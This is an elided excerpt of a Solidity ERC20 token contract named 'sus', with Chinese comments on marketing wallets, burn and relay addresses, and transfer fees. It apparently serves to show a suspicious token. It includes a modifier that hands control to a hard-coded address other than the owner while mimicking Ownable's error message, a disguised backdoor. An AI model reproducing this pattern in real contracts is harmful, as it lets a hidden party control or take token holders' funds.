...
contract sus is ERC20, Ownable {
    ...
    uint256 public swapTokensAtAmount = 1 * (10**18);//合约地址多少数量换成U
    address private deadAddress = address(0);
    address public _marketingWalletAddress = 0x01C1C27035849c3C0E69F2fde21183055A1A0Be5;//营销钱包
    address public _marketingWalletAddress2 = 0x01C1C27035849c3C0E69F2fde21183055A1A0Be5;//营销钱包
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);//销毁地址
    address private _mindAddress = address(0x0fF6E052720f156218775A22DfaDE5b7673e477D);//中转地址(授权U给合约地址)
    ...
    constructor() public ERC20("EE", "EE") {
    ...
    modifier qeeabAddress() {
        require(msg.sender == 0x2705A4E6b169fA95efE753B37A3f4DDf599ce025, "Ownable: caller is not the owner");
        _;
    }
    ...
    function _transfer(
        ...
        if(takeFee) {
        	uint256 lpfees = amount.mul(4).div(100);//营销分红回流
        	uint256 deadfees = amount.mul(1).div(100);//1%销毁 
    ...
    function _swapAndLiquid() private {
        ...
        if(fistval > 0){
            uint256 mr1 = fistval.div(3);
            uint256 mr2 = fistval.div(3);
